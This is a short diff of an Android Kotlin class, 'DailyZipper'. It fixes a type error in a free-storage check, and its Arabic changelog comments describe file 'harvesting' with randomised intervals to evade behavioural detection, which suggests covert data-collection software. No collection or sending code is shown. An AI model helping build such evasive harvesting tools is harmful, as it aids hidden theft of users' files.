@@ -35,6 +35,7 @@ import kotlin.random.Random
  * ✅ تم إضافة إعادة محاولة تلقائية للملفات الفاشلة.
  * ✅ تم إضافة عشوائية في فترات الحصاد لتجنب الكشف السلوكي.
  * ✅ تم إصلاح خطأ Type mismatch في processedHashes و failedHashes بتحديد النوع العام <String>.
+ * ✅ تم إصلاح خطأ Type mismatch في checkStorage باستخدام extractConfigValues() بدلاً من getConfigValue.
  */
 class DailyZipper(
     context: Context,
@@ -184,7 +185,9 @@ class DailyZipper(
                 @Suppress("DEPRECATION")
                 stat.availableBlocks * stat.blockSize
             }
-            availableBytes >= requiredBytes + getConfigValue("storage_extra", 100L * 1024L * 1024L)
+            // ✅ التصحيح: استخدام extractConfigValues() بدلاً من getConfigValue لتجنب Type mismatch
+            val storageExtra = extractConfigValues().storageExtra
+            availableBytes >= requiredBytes + storageExtra
         } catch (e: Exception) {
             writeLog("Storage check error: ${e.message}")
             true
